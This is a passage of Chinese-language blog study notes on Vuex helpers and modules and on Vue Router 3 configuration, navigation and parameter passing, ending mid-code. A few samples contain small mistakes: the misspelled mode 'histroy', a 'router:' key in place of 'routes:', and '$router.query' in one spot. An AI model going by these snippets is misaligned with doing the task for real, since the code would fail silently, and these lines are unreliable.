id="辅助函数-mapMutations"><a href="#辅助函数-mapMutations" class="headerlink" title="辅助函数 mapMutations"></a>辅助函数 mapMutations</h2><p>用法和 mapState 很像</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mapState, mapMutations, mapActions &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    ...<span class="title function_">mapMutations</span>([<span class="string">&#x27;changeCount&#x27;</span>])</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用方法</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">changeCount</span>(n)</span><br><span class="line"><span class="comment">// 等价于下面的写法</span></span><br><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">    changeCount (n) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;changeCount&#x27;</span>, n)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="actions-对象"><a href="#actions-对象" class="headerlink" title="actions 对象"></a>actions 对象</h1><p>mutations 只能处理同步操作</p><p>actions 用于处理异步操作</p><ol><li>提供actions 方法</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">actions</span>: &#123;</span><br><span class="line">    setAsyncCount (context, num) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            context.<span class="title function_">commit</span>(<span class="string">&#x27;changeCount&#x27;</span>, num)</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>在组件中调用</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setAsyncCount () &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">&#x27;setAsyncCount&#x27;</span>, <span class="number">666</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="辅助函数-mapActions"><a href="#辅助函数-mapActions" class="headerlink" title="辅助函数 mapActions"></a>辅助函数 mapActions</h2><p>mapActions 是位于 actions中的方法提取出来，映射到组件methods中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mapState, mapMutations, mapActions &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    ...<span class="title function_">mapActions</span>([<span class="string">&#x27;setAsyncCount&#x27;</span>])</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="getters"><a href="#getters" class="headerlink" title="getters"></a>getters</h1><p>除了state之外，有时我们还需要从state中派生出一些状态，这些状态是依赖state的，此时会用到getters</p><p>例如，state中定义了list，为1-10的数组，显示出大于5的数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">list</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>定义getters</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">getters</span>: &#123;</span><br><span class="line">    <span class="comment">// getters函数的第一个参数是 state</span></span><br><span class="line">    <span class="comment">// 必须要有返回值</span></span><br><span class="line">    <span class="attr">filterList</span>:  <span class="function"><span class="params">state</span> =&gt;</span>  state.<span class="property">list</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item &gt; <span class="number">5</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用getters</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; $store.getters.filterList &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="辅助函数-mapGetters"><a href="#辅助函数-mapGetters" class="headerlink" title="辅助函数 mapGetters"></a>辅助函数 mapGetters</h2><p>mapGetters 是位于getters中的方法提取出来，映射到组件computed中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">    ...<span class="title function_">mapGetters</span>([<span class="string">&#x27;filterList&#x27;</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; filterList &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="modules-模块"><a href="#modules-模块" class="headerlink" title="modules 模块"></a>modules 模块</h1><ol><li>模块定义，在 <code>store/modules/</code> 文件夹下，创建模块文件</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">  <span class="attr">userInfo</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;zs&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> mutations = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> actions = &#123;&#125;</span><br><span class="line"><span class="keyword">const</span> getters = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  state,</span><br><span class="line">  mutations,</span><br><span class="line">  actions,</span><br><span class="line">  getters</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>注册模块，在 <code>store/index.js</code> 文件内导入注册这个模块</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> user <span class="keyword">from</span> <span class="string">&#x27;./modules/user&#x27;</span></span><br><span class="line"><span class="keyword">import</span> setting <span class="keyword">from</span> <span class="string">&#x27;./modules/setting&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    <span class="attr">modules</span>:&#123;</span><br><span class="line">        user,</span><br><span class="line">        setting</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p><strong>获取 state 数据</strong>：</p><p>可以直接使用模块名访问：<code>$store.state.模块名.xxx</code></p><p>使用默认根级别的映射：<code>mapState([&#39;xxx&#39;])</code></p><p>也可以使用子模块映射： <code>mapState(&#39;模块名&#39;, [&#39;xxx&#39;])</code> - 需要开启命名空间 <code>namespaced:true</code></p><p><strong>获取 getters 数据</strong>：</p><p>可以直接使用模块名访问：<code>$store.getters[&#39;模块名/xxx&#39;]</code></p><p>使用默认根级别的映射：<code>mapGetters([&#39;xxx&#39;])</code></p><p>也可以使用子模块映射： <code>mapGetters(&#39;模块名&#39;, [&#39;xxx&#39;])</code> - 需要开启命名空间 <code>namespaced:true</code></p><p><strong>获取 mutations 数据</strong>：</p><p>注意：默认模块中的 mutation 和 actions 会被挂载到全局，<strong>需要开启命名空间</strong>，才会挂载到子模块。</p><p>可以直接使用模块名访问：<code>$store.commit(&#39;模块名/xxx&#39;, 额外参数)</code></p><p>使用默认根级别的映射：<code>mapMutations([&#39;xxx&#39;])</code></p><p>也可以使用子模块映射： <code>mapMutations(&#39;模块名&#39;, [&#39;xxx&#39;])</code> - 需要开启命名空间 <code>namespaced:true</code></p><p><strong>获取 actions 数据</strong>：</p><p>注意：默认模块中的 mutation 和 actions 会被挂载到全局，<strong>需要开启命名空间</strong>，才会挂载到子模块。</p><p>可以直接使用模块名访问：<code>$store.dispatch(&#39;模块名/xxx&#39;, 额外参数)</code></p><p>使用默认根级别的映射：<code>mapActions([&#39;xxx&#39;])</code></p><p>也可以使用子模块映射： <code>mapActions(&#39;模块名&#39;, [&#39;xxx&#39;])</code> - 需要开启命名空间 <code>namespaced:true</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  state,</span><br><span class="line">  mutations,</span><br><span class="line">  actions,</span><br><span class="line">  getters</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Vue.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue-路由</title>
      <link href="/2024/03/25/Vue-%E8%B7%AF%E7%94%B1/"/>
      <url>/2024/03/25/Vue-%E8%B7%AF%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<h1 id="路由介绍"><a href="#路由介绍" class="headerlink" title="路由介绍"></a>路由介绍</h1><p><strong>单页应用程序</strong>：指的是所有功能都在一个html页面实现的，通过<strong>路由</strong>实现页面的按需更新，只更新内容，头部标签等等保持不变，提高性能</p><p>具体实例：</p><ul><li>单页应用网站： 网易云音乐 <a href="https://music.163.com/">https://music.163.com/</a></li><li>多页应用网站：京东 <a href="https://jd.com/">https://jd.com/</a></li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682441912977.png" alt="1682441912977.png"></p><p>Vue 中的路由：<strong>路径</strong>和<strong>组件</strong>的映射关系</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682443040372.png" alt="1682443040372.png"></p><h1 id="路由的使用"><a href="#路由的使用" class="headerlink" title="路由的使用"></a>路由的使用</h1><p><strong>VueRouter</strong>：</p><p><strong>作用</strong>：修改地址栏路径时，切换显示匹配的组件 </p><p><strong>说明</strong>：Vue 官方的一个路由插件，是一个第三方包 </p><p><strong>官网</strong>：<a href="https://v3.router.vuejs.org/zh/">https://v3.router.vuejs.org/zh/</a></p><ol><li>下载 VueRouter 模块到当前工程，（Vue2 兼容的版本为3.6.5）</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add vue-router@3.6.5</span><br></pre></td></tr></table></figure><ol start="2"><li>main.js中引入VueRouter</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>安装注册</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br></pre></td></tr></table></figure><ol start="4"><li>创建路由对象</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>()</span><br></pre></td></tr></table></figure><ol start="5"><li>注入，将路由对象注入到new Vue实例中，建立关联</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>),</span><br><span class="line">  <span class="attr">router</span>: router</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>当配置完成之后，浏览器地址就会自动添加<code>/#/</code>的后缀了，表示项目已经被Vue-Router接管了</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325135512.png" alt="image.png"></p><ol start="6"><li>创建需要的组件（views目录），配置路由规则</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325140418.png" alt="image.png"></p><ol start="7"><li>配置导航，配置路由出口（路径匹配的组件现实的位置）</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325140510.png" alt="image.png"></p><ul><li><code>&lt;router-view&gt;&lt;/router-view&gt;</code>为匹配的组件所展示的位置</li></ul><h2 id="组件存放目录问题"><a href="#组件存放目录问题" class="headerlink" title="组件存放目录问题"></a>组件存放目录问题</h2><p>存放组件的文件夹有 views 和 components ，都是 .vue 文件，本质上是没有区别的，但在实际开发中需要进行区分</p><p><strong>区别</strong>：</p><ul><li>views文件夹：存放页面组件，用于页面展示，配合路由使用</li><li>components文件夹：存放复用组件，用于展示数据，常用于复用</li></ul><h1 id="路由模块封装"><a href="#路由模块封装" class="headerlink" title="路由模块封装"></a>路由模块封装</h1><p>将路由模块进行封装抽离出来，有利于后期维护</p><p>创建 <code>src/router/index.js</code> 文件，用于存放路由模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/router/index.js 编写路由模块</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.js 导入路由模块</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>),</span><br><span class="line">  <span class="attr">router</span>: router</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>注意：绝对路径可以使用<code>@</code>指代src目录，可以快速引入组件</li></ul><h1 id="声明式导航"><a href="#声明式导航" class="headerlink" title="声明式导航"></a>声明式导航</h1><h2 id="导航链接"><a href="#导航链接" class="headerlink" title="导航链接"></a>导航链接</h2><p>vue-router 提供了一个全局组件 router-link (取代 a 标签)</p><ul><li><strong>能跳转</strong>，配置 to 属性指定路径(<strong>必须</strong>) 。本质还是 a 标签 ，<strong>to 无需 #</strong></li><li><strong>能高亮</strong>，默认就会提供<strong>高亮类名</strong>，可以直接设置高亮样式</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer_wrap&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/find&quot;</span>&gt;</span>发现音乐<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/my&quot;</span>&gt;</span>我的音乐<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/friend&quot;</span>&gt;</span>朋友<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;top&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 路由出口 → 匹配的组件所展示的位置 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="两个类名"><a href="#两个类名" class="headerlink" title="两个类名"></a>两个类名</h2><p>使用 router-link 标签，会自动添加两个高亮类名</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682493610911.png" alt="1682493610911.png"></p><ol><li>router-link-active 模糊匹配（常用）<ul><li>to&#x3D;”&#x2F;my” 可以匹配 &#x2F;my、&#x2F;my&#x2F;a、&#x2F;my&#x2F;b ….</li><li>只要是以&#x2F;my开头的路径 都可以和 to&#x3D;”&#x2F;my”匹配到</li></ul></li><li>router-link-exact-active 精准匹配<ul><li>to&#x3D;”&#x2F;my” 仅可以匹配 &#x2F;my</li></ul></li></ol><h3 id="自定义类名"><a href="#自定义类名" class="headerlink" title="自定义类名"></a>自定义类名</h3><p>这两个类名太长了，咱可以自定义一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [...],</span><br><span class="line">  <span class="attr">linkActiveClass</span>: <span class="string">&quot;类名1&quot;</span>,</span><br><span class="line">  <span class="attr">linkExactActiveClass</span>: <span class="string">&quot;类名2&quot;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="跳转传参"><a href="#跳转传参" class="headerlink" title="跳转传参"></a>跳转传参</h2><p>在跳转路由时，传递参数</p><ol><li>查询参数传参<ul><li>语法：<code>to=&quot;/path?参数名=值&quot;</code></li><li>对应网页接收参数：<code>$router.query.参数名</code></li></ul></li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325152343.png" alt="image.png"></p><ol start="2"><li>动态路由传参<ul><li>配置动态路由 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/home&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Home</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/search/:words&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Search</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li>配置导航链接：<code>to=&quot;/path/参数值&quot;</code></li><li>对应页面组件接收传递过来的值：<code>$route.params.参数名</code></li></ul></li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325152408.png" alt="image.png"></p><p><strong>对比</strong>：</p><ol><li>查询参数传参，比较适合传<strong>多个参数</strong><ul><li>跳转：<code>to=&quot;/path?参数名=值&amp;参数名2=值&quot;</code></li><li>获取：<code>$route.query.参数名</code></li></ul></li><li>动态路由传参<strong>优雅简洁</strong>，传单个参数比较方便<ul><li>配置动态路由：<code>path: &quot;/path/:参数名&quot;</code></li><li>跳转：<code>to=&quot;/path/参数值&quot;</code></li><li>获取：<code>$route.params.参数名</code></li><li>注意：动态路由也可以传多个参数，但一般只传一个</li></ul></li></ol><p><strong>可选符</strong>：</p><p>当使用了动态路由传参<code>path: &quot;/path/:words&quot;</code>时，如果直接访问<code>/path</code>，也就是不传递参数的话，就无法匹配到页面</p><p><code>/search/:words</code> 表示，<strong>必须要传参数</strong>。如果不传参数，也希望匹配，可以加个可选符<code>&quot;？&quot;</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line"> ...</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/search/:words?&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Search</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><p><strong>重定向</strong>：匹配 path 后，强制跳转 path 路径</p><p><strong>语法</strong>：<code>&#123; path: 匹配路径, redirect: 重定向到的路径 &#125;</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line"><span class="attr">router</span>: [</span><br><span class="line">&#123; <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>, <span class="attr">redirect</span>: <span class="string">&#x27;/home&#x27;</span> &#125;,</span><br><span class="line">&#123; <span class="attr">path</span>: <span class="string">&#x27;/home&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Home</span> &#125;,</span><br><span class="line">&#123; <span class="attr">path</span>: <span class="string">&#x27;/search/:words&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Search</span> &#125;</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="404"><a href="#404" class="headerlink" title="404"></a>404</h1><p><strong>作用</strong>：当路径找不到匹配时，给个提示页面</p><p><strong>位置</strong>：404的路由，虽然配置在任何一个位置都可以，但一般都<strong>配置在其他路由规则的最后面</strong></p><p><strong>语法</strong>：<code>path: &quot;*&quot;</code> (任意路径) – 前面不匹配就命中最后这个</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    ...</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;*&#x27;</span>, <span class="attr">component</span>: <span class="title class_">NotFind</span> &#125; <span class="comment">//最后一个</span></span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="模式设置"><a href="#模式设置" class="headerlink" title="模式设置"></a>模式设置</h1><p>路由的路径看起来不自然，有<code>#</code>，能否切成真正路径形式?</p><ul><li>hash路由(默认)，例如: <code>http://localhost:8080/#/home</code></li><li>history路由(常用)，例如: <code>http://localhost:8080/home</code> (以后上线需要服务器端支持，开发环境webpack给规避掉了history模式的问题)</li></ul><p><strong>语法</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">    <span class="attr">mode</span>:<span class="string">&#x27;histroy&#x27;</span>, <span class="comment">//默认是hash</span></span><br><span class="line">    <span class="attr">routes</span>:[]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="编程式导航"><a href="#编程式导航" class="headerlink" title="编程式导航"></a>编程式导航</h1><h2 id="基本跳转"><a href="#基本跳转" class="headerlink" title="基本跳转"></a>基本跳转</h2><p>当需要按钮跳转等操作时</p><p><strong>path路径跳转</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;路由路径&#x27;</span>)</span><br><span class="line"><span class="comment">//完整写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;路由路径&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>name命名路由跳转（适合 path 路径长的场景）</strong>：</p><ul><li>路由规则，必须配置name配置项</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">name</span>: <span class="string">&#x27;路由名&#x27;</span>, <span class="attr">path</span>: <span class="string">&#x27;/path/xxx&#x27;</span>, <span class="attr">component</span>: <span class="variable constant_">XXX</span> &#125;,</span><br></pre></td></tr></table></figure><ul><li>通过name来进行跳转</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title 